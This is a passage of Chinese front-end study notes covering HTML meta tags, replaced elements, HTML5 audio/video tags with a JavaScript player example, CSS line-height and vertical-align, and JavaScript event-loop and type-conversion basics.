     - 怪异模式
     - 部分怪异（近乎标准）模式
       关于IE浏览器的文档模式，浏览器模式，严格模式，怪异模式，DOCTYPE标签，可详细阅读[模式？标准！](http://padding.me/blog/2014/07/04/mode-or-standard/)的内容。

2. **charset**

   声明文档使用的字符编码，

   ```
   <meta charset="utf-8">
   ```

   html5 之前网页中会这样写：

   ```
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
   ```

   这两个是等效的，具体可移步阅读http://stackoverflow.com/questions/4696499/meta-charset-utf-8-vs-meta-http-equiv-content-type，所以建议使用较短的，易于记忆。

3. **lang属性**

   简体中文

   ```
   <html lang="zh-cmn-Hans">
   ```

   繁体中文

   ```
   <html lang="zh-cmn-Hant">
   ```

4. **http-equiv**

   **优先使用 IE 最新版本和 Chrome**

   ```
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
   ```

   **360 使用Google Chrome Frame**

   ```
   <meta name="renderer" content="webkit">
   ```

   360浏览器就会在读取到这个标签后，立即切换对应的极速核。
   另外为了保险起见再加入

   ```
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
   ```

   这样写可以达到的效果是如果安装了Google Chrome Frame，则使用GCF来渲染页面，如果没有安装GCF，则使用最高版本的IE内核进行渲染。

5. **百度禁止转码**

   通过百度手机打开网页时，百度可能会对你的网页进行转码，脱下你的衣服，往你的身上贴狗皮膏药的广告，为此可在head内添加

   ```
   <meta http-equiv="Cache-Control" content="no-siteapp" />
   ```

6. **SEO优化部分**

   页面标题`<title>`标签(head头部必须)

   ```
   <title>your title</title>
   ```

   页面关键词keywords

   ```
   <meta name="keywords" content="your keywords">
   ```

   页面描述内容description

   ```
   <meta name="description" content="your description">
   ```

   定义网页作者author

   ```
   <meta name="author" content="author,email address">
   ```

   定义网页搜索引擎索引方式,robotterms是一组使用英文逗号「,」分割的值，通常有如下几种取值：none，noindex，nofollow，all，index和follow。

   ```
   <meta name="robots" content="index,follow">
   ```

7. **viewport**

   `viewport` 可以让布局在移动浏览器上显示的更好。
   通常会写

   ```
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   ```

   `width=device-width` 会导致 iPhone 5 添加到主屏后以 WebApp 全屏模式打开页面时出现黑边(http://bigc.at/ios-webapp-viewport-meta.orz)

   content 参数：

   1、width viewport 宽度(数值/device-width)

   2、height viewport 高度(数值/device-height)

   3、initial-scale 初始缩放比例

   4、maximum-scale 最大缩放比例

   5、minimum-scale 最小缩放比例

   6、user-scalable 是否允许用户缩放(yes/no)

   7、minimal-ui iOS 7.1 beta 2 中新增属性，可以在页面加载时最小化上下状态栏。这是一个布尔值，可以直接这样写：

   ```
   <meta name="viewport" content="width=device-width, initial-scale=1, minimal-ui">
   ```

   而如果你的网站不是响应式的，请不要使用initial-scale或者禁用缩放。

   ```
   <meta name="viewport" content="width=device-width,user-scalable=yes">
   ```

   相关链接：[非响应式设计的viewport](http://www.qianduan.net/non-responsive-design-viewport.html)

   适配iPhone 6 和iPhone 6plus 则需要写：

   ```
   <meta name="viewport" content="width=375">
   <meta name="viewport" content="width=414">
   ```

   大部分4.7~5寸的安卓设备的viewport宽设为360px，iPhone 6上却是375px，大部分5.5寸安卓机器（比如说三星Note）的viewport宽为400，iPhone 6 plus 上是414px。

8. **favicon icon**

   ```
   <link rel="shortcut icon" type="image/ico" href="/favicon.ico" /> <!-- 添加 favicon icon -->
   ```

9. **移动端的meta**

   ```
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
     <meta name="format-detection"content="telephone=no, email=no" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
     <meta name="apple-mobile-web-app-capable" content="yes" /><!-- 删除苹果默认的工具栏和菜单栏 -->
     <meta name="apple-mobile-web-app-status-bar-style" content="black" /><!-- 设置苹果工具栏颜色 -->
     <meta name="format-detection" content="telphone=no, email=no" /><!-- 忽略页面中的数字识别为电话，忽略email识别 -->
     <!-- 启用360浏览器的极速模式(webkit) -->
     <meta name="renderer" content="webkit">
     <!-- 避免IE使用兼容模式 -->
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <!-- 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓 -->
     <meta name="HandheldFriendly" content="true">
     <!-- 微软的老式浏览器 -->
     <meta name="MobileOptimized" content="320">
     <!-- uc强制竖屏 -->
     <meta name="screen-orientation" content="portrait">
     <!-- QQ强制竖屏 -->
     <meta name="x5-orientation" content="portrait">
     <!-- UC强制全屏 -->
     <meta name="full-screen" content="yes">
     <!-- QQ强制全屏 -->
     <meta name="x5-fullscreen" content="true">
     <!-- UC应用模式 -->
     <meta name="browsermode" content="application">
     <!-- QQ应用模式 -->
     <meta name="x5-page-mode" content="app">
     <!-- windows phone 点击无高光 -->
     <meta name="msapplication-tap-highlight" content="no">
     <!-- 适应移动端end -->
   ```

#### 可替换元素

请问什么是可替换元素和非可替换元素，它们的差异是什么？并举例说明

　　前端面试中HTML的题目本来就最少，而且并不难，翻来覆去也就那几样。我们之前已经谈到过最经典的HTML语义化，今天就借此机会来谈谈可替换元素。

　　释义

　　什么是可替换元素？顾名思义，就是会被替换的元素。（尬笑……

　　比如一个典型的可替换元素img：

　　<img src=xxx.jpg>

　　我们并没有在img标签中写入任何内容，那它的内容从哪里来的呢？

　　是浏览器去下载src属性给到的图片，并用该图片资源替换掉img标签，而且浏览器在下载前并不知道图片的宽高。所以，可替换元素比较特殊，它的宽高是由其加载的内容决定的。（当然CSS可以覆盖其样式）

　　示例

　　还是用img标签举几个例子：

　　imgsrc="https://avatars2.githubusercontent.com/u/17703242?s=460&v=4"

　　该图片在页面中展现出来的话，就是图片本身本身的宽高。

　　img元素也支持width和height属性：

　　imgwidth="80"height="80"src="https://avatars2.githubusercontent.com/u/17703242?s=460&v=4"

　　此时该元素展现出来就是宽高为80像素。

　　如果我们再用CSS去覆盖其样式：

　　img{

　　width:60px;

　　height:60px;

　　}

　　该元素的展现即为60像素。

　　MDN的释义

　　看过上面的例子之后我们再来理解概念性的知识就比较容易了。

　　可替换元素（replacedelement）的展现效果不是由CSS来控制的。这些元素是一种外部对象，它们外观的渲染，是独立于CSS的。

　　简单来说，它们的内容不受当前文档的样式的影响。CSS可以影响可替换元素的位置，但不会影响到可替换元素自身的内容。

　　典型的可替换元素有<iframe><video><embed><img>，还有一些元素仅在特定情况下被作为可替换元素处理，比如<input>。

![img](https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=288940854,3852752120&fm=26&gp=0.jpg)![img](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2941711175,155850835&fm=26&gp=0.jpg)

#### HTML5

##### 音视频标签详解

**一、发展历：**

**早期：****<embed>+<object>+****文件**

 　问题：不是所有浏览器都支持，而且embed不是标准。

**现状：****Realplay****、****window media****、****Quick Time** **、****Flash**

　　问题：每个厂商每个标准，网站编码和格式也都不相同，flash的出现解决了面的问题，但是apple在07年决定任何设备将不再支持flash。

HTML5认为浏览器应该原生支持音视频，因为他们现在也是web中的一等公民了！

**二、视频格式的简单介绍**

1、**常见的视频格式**

视频的组成部分：画面、音频、编码格式

视频编码：H.264、Theora、VP8(google开源)

**常见的音频格式**

**音频**编码：ACC、MP3、Vorbis

2、HTML5支持的格式

HTML5能在完全脱离插件的情况下播放音视频但是不是所有格式都支持。HTML5支持的视频格式：

　　**Ogg** =带有Theora视频编码+Vorbis音频编码的Ogg文件    支持的浏览器:F、C、O  

　　**MEPG4**=带有H.264视频编码+AAC音频编码的MPEG4文件   支持的浏览器: S、C　　　　

　　**WebM**=带有VP8视频编码+Vorbis音频编码的WebM格式    支持的浏览器: I、F、C、O

**三、<Video>**

1.**标签的使用：**

```
	<video src="文件地址" controls="controls"></video>
```

IE9以上才支持HTML5，对于不支持的浏览器应该有友好的提示：

```
     <video src="文件地址" controls="controls">
             您的浏览器暂不支持video标签。播放视频
     </ video >
```

再优化：让video标签载入多种不同的音频格式，让浏览器选择他支持的格式，第一个找到了播放第一条，没找到找第二条，以此类推，最后还没找到给出提示不支持

```
    <video  controls="controls"  width="600">
        <source src="movie.ogg" type="video/ogg" >
        <source src="move.mp4" type="video/mp4" >
        您的浏览器暂不支持video标签。播放视频
    </ video >
```

2.**Video标签的常见属性**

![img](https://images0.cnblogs.com/i/591234/201403/291118416728898.png)

```
     <video src="movie.ogg" controls="controls" Loop="Loop" poster="PLMM.jpg" id="video">
                 您的破浏览器都是古董早该换了，不然休想看我们的激情小电影。
     </video>
```

3.**Video的API方法**

![img](https://images0.cnblogs.com/i/591234/201403/291138373121025.png)

4.**Video的API属性**

![img](https://images0.cnblogs.com/i/591234/201403/291150419375014.png)![img](https://images0.cnblogs.com/i/591234/201403/291200432347279.png)

![img](https://images0.cnblogs.com/i/591234/201403/291248234223811.png)

```
<body>
    <video src="movie.webm" controls="controls" id="video">
            您的破浏览器都是古董早该换了，不然休想看我们的激情小电影。
    </video>
    <br />
    <button onClick="bofang()">播放</button>
    <button onClick="zanting()">暂停</button>
     <button onClick="kuaijin()">快进</button>
     <button onClick="kuaitui()">快退</button>
     <button onClick="jingyin(this)">静音</button>
     <button onClick="jiansu()">减速</button>
     <button onClick="jiasu()">加速</button>
     <button onClick="normal()">正常播放</button>
      <button onClick="up()">增大音量</button>
       <button onClick="down()">减小音量</button>
    <script>
        //获取对应的video标签
        var video = document.getElementById('video');
        //播放方法
        function bofang(){
            video.play();
        }
        //暂停方法
        function zanting(){
            video.pause();
        }
        //快进按钮
        function kuaijin(){
            video.currentTime+=10;//currentTime该属性是获取当前播放的时间，加加上10就快进10秒
        }
        //快退
        function kuaitui(){
            video.currentTime-=10;
        }
        //静音
        function jingyin(obj){
            if(video.muted){
                obj.innerHTML='静音';
                video.muted=false;
            }else{
                obj.innerHTML='关闭静音';
                video.muted=true;
            }
        }
        //加速播放(快3倍) //要想慢3倍，应该是3分之1，因为当前是1
        function jiansu(){
            video.playbackRate = 1/3; 
        }
        //减速播放(慢3倍)
        function jiasu(){
            video.playbackRate=3;
        }
        //正常播放
        function normal(){
            video.playbackRate=1;
        }
        //调大音量,音量值的范围是0到1
        function up(){
            video.volume+=0.2;
        }
        //调小声音
        function down(){
            video.volume-=0.2;
        }
    </script>
</body>
</html>
```

5.**Video的常用事件**

![img](https://images0.cnblogs.com/i/591234/201403/291330210008109.png)

![img](https://images0.cnblogs.com/i/591234/201403/291330472971076.png)

 **1、获取视频时间长度**

当视频载入video后，使用 onloadedmetadata 事件获取视频的时间长度。

```
     video.onloadedmetadata = function () { 
     var vLength = video.duration; 
     console.log(vLength); 
     } 
```

**2、当前视频的播放进度**

当视频开始播放时，可以使用 ontimeupdate 事件获取视频当前播放的进度。当video对象的 currentTime 属性发生改变时触发 ontimeupdate 事件。currentTime 属性是浮点小数，可取到 12 位数的小数位数。

```
      video.ontimeupdate = function () { 
     var vTime = video.currentTime; 
     console.log(vTime); 
     }; 
```

**四、HTML5支持的音频格式**

HTML5在不使用插件的情况下也可以原生的支持音频格式文件的播放，当然支持格式是有限的

HTML5支持的音频格式：

　　Ogg   免费 支持的浏览器:C、F、O

　　MP3   收费 支持的浏览器: I、C、S

　　Wav   收费 支持的浏览器: F、O、S

 **五、<audio>**

1.标签的使用

```
	<audio  src="文件地址" controls="controls"></audio>
```

IE9以上才支持HTML5，对于不支持的浏览器应该有友好的提示：

```
     <audio src="文件地址" controls="controls">
         您的浏览器暂不支持audio标签。播放视频
     </ audio >
```

再优化：让video标签载入多种不同的音频格式，让浏览器选择他支持的格式，第一个找到了播放第一条，没找到找第二天，以此类推，最后还没找到给出提示不支持

```
     < audio controls="controls"  >
         <source src="happy.MP3" type="video/mp3" >
         <source src="happy.ogg" type="video/ogg" >
         您的浏览器暂不支持audio标签。播放视频
     </ audio>
```

audio的常见属性

![img](https://images0.cnblogs.com/i/591234/201403/291346200006996.png)

该标签除了一些属性不同外，其他API方法都是一样

### 		CSS

#### line-height

> **行高是指文本行基线间的垂直距离。** `基线`（base line）并不是汉字文字的下端沿，而是英文字母“x”的下端沿。下图中两条红线之间的距离就是`行高`，上行的底线和下一行顶线之间的距离就是`行距`，而同一行顶线和底线之间的距离是font-size的大小，行距的一半是半行距。

![在这里插入图片描述](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303173323.png)

从上图我们就可以看出，行距、font-size与line-height之间的关系了吧。接下来进一步来看看这三者关系

![在这里插入图片描述](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303173407.png)

当font-size等于line-height时，行距 = line-height - font-size = 0；

**由此我们可以知道为什么盒子里的inline元素行高等于父盒子高度就垂直居中的原理了**

原理：假设一个div高度为100px包裹一个span，span字体大小为20px,line-height设置为100px,那么span的行距为100-20 = 80,半行距为40,

​			而字体处于两个半行距中间，所以看起来就垂直了

而当font-size大于line-height时，则会出现行距为负值，则两行重叠，如下图：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303173441.png" alt="在这里插入图片描述" style="zoom:80%;" />

关于CSS boxes的四种类型（containing boxes(包含块）、inline boxes、line boxes、content area）和line-height五种取值方法（line-height:normal;、line-height:inherit;、line-height:120%;、line-height:25px;、line-height:1.2）

#### vertical-align

两个div 都设置 display：inline-block，正常显示；但是在第二个div中加一个块级元素或者内联元素，显示就变了个样，为什么？

```
     <meta charset="utf-8"/>
     <style>
     div{
         width: 100px;
         height: 100px;
         border:1px solid red;
         display: inline-block;
     }
     .align{
     /*    vertical-align: top;*/
     }
     </style>
     <body>
         <div>
         </div>
         <div class="align">为什么？</div>
     </body>
```

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303174426.png)

首先我们要明确一点：

`行内元素基于基线对齐`，不需要有父盒子，回自动在一行生成line-box

那么基线如何确定呢？

**baseline的确定规则**

1、inline-table元素的baseline是它的table第一行的baseline。

2、父元素【line box】的baseline是最后一个inline box 的baseline。 

3、inline-block元素的baseline确定规则

- 规则1：inline-block元素，如果内部有line box，则inline-block元素的baseline就是最后一个作为内容存在的元素[inline box]的baseline，而这个元素的baseline的确定就要根据它自身来定了。
- 规则2：inline-block元素，如果其内部没有line box或它的overflow属性不是visible，那么baseline将是这个inline-block元素的底margin边界。

4、如果是可替换元素，那么baseline将是该元素的底部

5、字体的baseline

![在这里插入图片描述](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303174856.png)

得出两个盒子的基线后，我们就很容易知道为什么这样（默认基线对齐）对齐了

![image-20210303175055627](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210303175056.png)



如果同一行的元素不同vertical-align不同呢？

那么就以高度最高的为基准



## 		Javascript

#### 简介

> JavaScript 是一门`跨平台、面向对象的脚本语言`，它能使网页可交互（例如拥有复杂的动画，可点击的按钮，通俗的菜单等）。另外还有高级的服务端Javascript版本，例如Node.js，它可以让你在网页上添加更多功能，不仅仅是下载文件（例如在多台电脑之间的协同合作）。在宿主环境（例如 web 浏览器）中， JavaScript 能够通过其所连接的环境提供的编程接口进行控制。
>
> JavaScript 和 Java 有一些共性但是在另一些方面有着根本性区别。JavaScript语言类似 Java 但是并`没有 Java 的静态类型和强类型检查特性`。JavaScript 遵循了 Java 的表达式语法，命名规范以及基础流程控制，这也是 JavaScript 比 LiveScript 更出名的原因。
>
> 与 Java 通过声明的方式构建类的编译时系统不同，JavaScript 采用基于少量的数据类型如数字、布尔、字符串值的运行时系统。`JavaScript 是一种基于原型而不是基于类的基于对象(object-based)语言`；也就是说，独立对象的继承是可以改变的。 JavaScript 支持匿名函数。 函数也可以作为对象的属性被当做宽松的类型方式执行。
>
> 与 Java 相比，Javascript 是一门形式自由的语言。你不必声明所有的变量，类和方法。你不必关心方法是否是公有、私有或者受保护的，也不需要实现接口。无需显式指定变量、参数、方法返回值的数据类型。
>
> Java 是基于类的编程语言，设计的初衷就是为了确保快速执行和类型安全。类型安全，举个例子，你不能将一个 Java 整数变量转化为一个对象引用，或者由Java字节码访问专有存储器。Java基于类的模型，意味着程序包含专有的类及其方法。Java的类继承和强类型要求紧耦合的对象层级结构。这些要求使得Java编程比JavaScript要复杂的多。
>
> 相比之下，JavaScript 传承了 HyperTalk 和 dBASE 语句精简、动态类型等精髓，这些脚本语言为更多开发者提供了一种语法简单、内置功能强大以及用最小需求创建对象的编程工具。

`注：`强类型：偏向于不容忍隐式类型转换。譬如说haskell的int就不能变成double

​	   弱类型：偏向于容忍隐式类型转换。譬如说C语言的int可以变成double

​	   静态类型：编译的时候就知道每一个变量的类型，因为类型错误而不能做的事情是语法错误。

​	   动态类型：编译的时候不知道每一个变量的类型，因为类型错误而不能做的事情是运行时错误。譬如说你不能对一个数字a写a[10]当数组用。

##### JavaScript是单线程

JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。

JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，`假定JavaScript同时有两  		 		 个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？`

`所以，为了避免复杂性（虽然也能够通过上锁来进行处理，但也会带来额外的开销），从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变`。

`为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。`

##### 事件循环与任务队列

Javascript是单线程的，单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。

如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。

JavaScript语言的设计者意识到，这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。

主线程从"任务队列"中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405145425.png" alt="image-20210405145424247"  />

Javascript`所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）`。`同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务会分配一个任务队列，任务队列中的任务分为微任务和宏任务。当同步任务全部执行完毕，就会到任务队列中寻找微任务，如果微任务没有了，就会执行宏任务。`

宏任务有以下几个：

![image-20210405145954321](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405145954.png)

微任务有以下几个：

![image-20210405150044783](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405150045.png)

经典面试题：

请写出下面代码的输出结果：

```
  setTimeout(() => {
      console.log(1);
    }, 0);
    new Promise(resolve=>{
      console.log(2);
      resolve()
      console.log(3);
    }).then(res=>{
      console.log(4);
    })
    console.log(5);
```

输出结果：2 3 5 4 1

##### 事件和回调函数

"任务队列"是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在"任务队列"中添加一个事件，表示相关的异步任务可以进入"执行栈"了。主线程读取"任务队列"，就是读取里面有哪些事件。

"任务队列"中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入"任务队列"，等待主线程读取。

`所谓"回调函数"（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。`

`"任务队列"是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，"任务队列"上第一位的事件就自动进入主线程。但是，由于存在后文提到的"定时器"功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。`

#### 基本语法

##### JS中的基本类型和引用类型

###### 基本数据类型

> Undefined、Null、Boolean、Number、String、Symbol

（1）基本类型的访问是按值访问的，就是说你可以操作保存在变量中的实际的值

（2）我们不能给基本类型添加属性和方法

（3）**基本类型的变量是存放在栈区的（栈区指内存里的栈内存），**栈区包括了 **变量的标识符**和**变量的值。**

![img](https://pic3.zhimg.com/80/v2-bd008aa41a32aa00e12dfbcae6fadf7e_720w.jpg)

**基本类型值传递** 

在函数接收基本类型值时，会在该函数内部栈中创建一个一模一样的变量,且两个参数互不影响，为了验证这一正确性，如下

```
	function fun(a) {
        a = 666
        console.log(a) //666
    }
    var num = 555
    fun(num)
    console.log(num)  //555
```

###### 引用数据类型

> Object、Array、RegExp、Date、Function

（1）引用类型的值是按引用访问的。

（2）引用类型可以拥有属性和方法，并且是可以动态改变的。

（3）**引用类型的存储需要内存的栈区和堆区（堆区是指内存里的堆内存）共同完成，栈区内存保存 变量标识符 和 指向堆内存中该对象的指针**

![img](https://pic2.zhimg.com/80/v2-e74aa0ddeb46d7ca059920b720739621_720w.jpg)

栈区和堆区相当于数据库和硬盘的关系，假设我们储存一部视频，那么我们是把视频存进硬盘，视频路径存进数据库，由于栈适合进行运算并且有大小限制，而堆内存几乎没有限制，所以进有了

这样的储存模式

**`引用类型值传递`** 

`当引用类型作为参数传递时，传递到函数内部的不是该参数的值，而是该参数在内存中的引用地址，这和引用类型的定义完全吻合。` 

`所以当引用类型作为参数传递被改变时，另一个值也会发生了改变`。如下

```
 function fun1(obj) {
        obj.name = '王二'
        obj.age = 20
        console.log(obj) //{name:'王二',age:20}
    }
    var o = {
        name: '张三',
        age: 18
    }
    fun1(o)
    console.log(o) //{name:'王二',age:20}
```

由于函数也是引用类型，所以利用这个特性我们可以形成回调函数：

```
 function afun(are, callback) { //目标函数
        are++
        callback(are)
    }
    var d = 2
    afun(d, function(res) {
        console.log(res) //3
    })
```

##### 类型转换

> JavaScript 是一种动态类型的语言，在执行运算操作的过程中，有时需要转换操作数的类型。在 JavaScript 中，数据类型的转换有：隐式类型转换和强制类型转换（也叫显式类型转换）两种方式。

###### 隐式类型转换

> 隐式类型转换会自动根据运算符进行类型转换。隐式类型转换的情况主要有以下几种。

1) 如果表达式中同时存在字符串类型和数字类型的操作数，而运算符使用加号`+`，此时 JavaScript 会自动将数字转换成字符串。

​	如果没有字符串类型，只是数字类型与其他类型，那么其他类型会转换为数字类型进行运算，例如：

```
     alert("姑娘今年" + 18);   //结果：姑娘今年18
     alert("15"+5);   //结果：155
     console.log(true + 1) //2
     console.log(undefined + 1)  //NaN
     console.log(null + 1)     //1
     true + true //=>2 布尔值转换为数字后做加法
	2 + null //=>2 null转换为0后做加法
	2 + undefined //=>NaN undefined转换为NaN做加法 
```

​	如果`+ -`只有一边有操作数时，字符串会自动转换成数字。如果变量不能转换，它仍然会是一个数字，但值为 NaN (不是一个数字):例如：

```
     let str = '1'
     console.log(typeof str); //String
     console.log(+str);       // 1
     console.log(typeof +str);//Number
     console.log(-str);       //-1
     console.log(typeof -str);//Number
     console.log(-'a')        //NaN
     console.log(typeof -'a') //Number
```

2) 如果表达式运算符为`-、*、/、%`中的任意一个，此时 JavaScript 会自动将字符串转换成数字，对无法转换为数字的则转换为 NaN。例如：

```
     alert("30"/5);   //除运算，结果为：6
     alert("15"-5);   //减运算，结果为：10
     alert("20"*"a"); //乘运算，结果为：NaN
     alert("20"%"3"); //取模运算，结果为：2
```

3) 运算符为`++`或`--`时，JavaScript 会自动将字符串转换成数字，对无法转换为数字的则转换为 NaN。例如：

```
     var num1 = "6";
     var num2 = "6";
     var num3 = "a";
     alert(++num1);  //将字符串转换为数字再进行++运算，结果为：7
     alert(--num2);  //将字符串转换为数字再进行--运算，结果为：5
     alert(++num3);  //字符串无法转换为数字，结果为：NaN
```

4) 运算符为`>`或`<`时，当两个操作数一个为字符串，一个为数字时，JavaScript 会自动将字符串转换成数字。例如：

```
     alert('10'>9);  //将字符串转换为数字，按值进行比较，结果为：true
     alert('10'<9);  //将字符串转换为数字，按值进行比较，结果为：false
```

​	如果两个操作数均为字符串时，JavaScript会根据字符串的字符集序号来进行比较的，例如：

```
	 console.log('10'>'9'); //false
	 console.log('b'>'a');  //true
```

5) `!`运算符将其操作数转换为布尔值并取反。例如：

```
     alert(！0);    //对0取反，结果为：true
     alert(！100); //对非0数字取反，结果为：false
     alert(!"ok"); //对非空字符串取反，结果为：false
     alert(!"");  //对空字符串取反，结果为：true
```

6) `==`运算符用于检测两个操作数是否相等，这里的比较很宽松因为允许了类型转换，检测室会通过如下逻辑：

​		1、如果一个值是`null`另一个是`undefined`，则相等

​		2、如果一个是数字一个是字符串，字符串转为数字再比较

​		3、如果是`true`则转换成1，`false`转换成0

​		4、如果一个值是对象另一个是数字或字符串，对象则转换成原始值（参考上文逻辑，注意日期类的例外情况）

```
     console.log(null == undefined)   //true
     console.log(1 == '1')    //true
     console.log(true == '1') //true
     console.log(null == 0) //false
     console.log(undefined == 0) //false
```

7) 当你尝试alert输出一个对象或一个变量时 JavaScript 会自动调用变量的 toString() 方法,下面方法是使用alert(）输出才会调用toString()方法：

```
     document.getElementById("demo").innerHTML = myVar;
     myVar = {name:"Fjohn"}  // toString 转换为 "[object Object]"
     myVar = [1,2,3,4]       // toString 转换为 "1,2,3,4"
     myVar = new Date()      // toString 转换为 "Fri Jul 18 2014 09:08:55 GMT+0200"
```

数字和布尔值也经常相互转换：

```
     console.log(typeof [1].toString());  //String
     console.log(typeof true.toString()); //String
     let a =123
     console.log(typeof a.toString());    //String
```

![image-20210304212100584](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210304212101.png)

###### 强制类型转换

> 从上面的介绍我们可以看到，JavaScript 可以自动根据运算的需要进行类型的转换。强制类型转换主要针对功能的需要或为了使代码变得清晰易读，人为地进行类型的转换。在 JavaScript 中，强制类型转换主要是通过调用全局函数 Number()、parseInt() 和 parseFloat() 来实现。

**1) 使用Number()函数将参数转换为一个数字**

使用格式如下：

```
	Number(value)	
```

**Number() 对参数 value 进行整体转换，当参数值中任何地方包含了无法转换为数字的符号时，转换失败，此时将返回 NaN，否则返回转换后的数字。**

Number() 对参数进行数字转换时，遵循以下一些规则：

- 如果参数中只包含数字时，将转换为十进制数字，忽略前导 0 以及前导空格；如果数字前面为`-`，`-`会保留在转换结果中；如果数字前面为`+`，转换后将删掉`+`号；

- 如果参数中包含有效浮点数字，将转换为对应的浮点数字，忽略前导 0 以及前导空格；如果数字前面为`-`，`-`会保留在转换结果中；如果数字前面为`+`，转换后将删掉`+`号；

- 如果参数中包含有效的十六进制数字，将转换为对应大小的十进制数字；

- 如果参数为空字符串，将转换为 0；

- 如果参数为布尔值，则将 true 转换为 1，将 false 转换为 0；

- 如果参数为 null，将转换为 0；

- `如果参数为 undefined，将转换为 NaN；`

- `如果参数为 Date 对象，将转换为从 1970 年 1 月 1 日到执行转换时的毫秒数；`

- `如果参数为函数、包含两个元素以上的数组对象以及除 Date 对象以外的其他对象，将转换为 NaN；`

- 如果在参数前面包含了除空格、`+`和`-`以外的其他特殊符号或非数字字符，或在参数中间包含了包括空格、`+`和`-`的特殊符号或非数字字符，将转换为 NaN。

  **转换示例：**

  ```
  alert(Number("0010"));  //去掉两个前导0，结果为：10
  alert(Number("+010"));  //去掉前导0和+，结果为：10
  alert(Number("-10"));  //转换后保留“-”号，结果为：-10
  alert(Number(''));      //空字符串的转换结果为：0
  alert(Number(true));   //布尔值true的转换结果为：1
  alert(Number(null));   //null值的转换结果为：0
  var d = new Date();      //创建一个Date对象
  alert(Number(d));     //转换Date对象，结果为1970.1.1至执行转换时的毫秒数：1511351635179
  alert(Number("100px"));   //参数中包含了不能转换为数字的字符px，结果为：NaN
  alert(Number("100 01"));  //参数中包含了空格，导致整个参数不能转换，结果为：NaN
  alert(Number("100-123")); //参数中包含了“-”，导致整个参数不能转换，结果为：NaN
  var a;                   //声明变量
  alert(Number(a));     //变量a没有赋值，因而a的值为undefined,转换undefined的结果为：NaN
  var fn = function (){alert(1);}; //创建一个函数对象
  alert(Number(fn));     //转换函数，结果为:NaN
  alert(Number(window)); //转换window对象，结果为:NaN
  ```

  从上述示例中，我们也可以看到，`Number() 是从整体上进行转换的，任何一个地方含有非法字符，都将导致转换无法成功`。接下来将介绍的两个函数与 Number() 不同的是，转换是从左到右逐位进行转换，任何一位无法转换时立即停止转换，同时返回已成功转换的值。

**2) 使用parseInt()函数将参数转换为一个整数**

使用格式如下：

```
	parseInt(stringNum,[radix])
```

stringNum 参数为需要转换为整数的字符串；radix 参数为 2～36 之间的数字，表示 stringNum 参数的进制数，取值为 10 时可省略。

parseInt() 的作用是将以 radix 为基数的 stringNum 字符串参数解析成十进制数。若 stringNum 字符串不是以合法的字符开头，则返回 NaN；`解析过程中如果遇到不合法的字符，将马上停止解析，并返回已经解析的值`。

parseInt() 在解析字符串为整数时，遵循以下规则：

- 解析字符串时，会忽略字符串前后的空格；如果字符串前面为`-`，`-`会保留在转换结果中；如果数字前面为`+`，转换后将删掉`+`号；

- 如果字符串前面为除空格、`+`和`-`以外的特殊符号或除 a～f（或 A～F）之外的非数字字符（`并且第二个参数需要标注为什么进制，否则一样返回NAN`)，，字符串将不会被解析，返回结果为 NaN；

- 在字符串中包含了空格、`+`、`-`和小数点“。”`等特殊符号或非数字的字符时，解析将在遇到这些字符时停止，并返回已解析的结果`；

- `如果字符串是空字符串，返回结果为 NaN。`

  **转换示例：**

  ```
  alert(parseInt("1101",2));  //以2为基数的1101字符串解析后的结果为：13
  alert(parseInt("a37f",16)); //以16为基数的a37f字符串解析后的结果为：41855
  alert(parseInt("123"));     //以10为基数的123字符串解析后的结果为：123
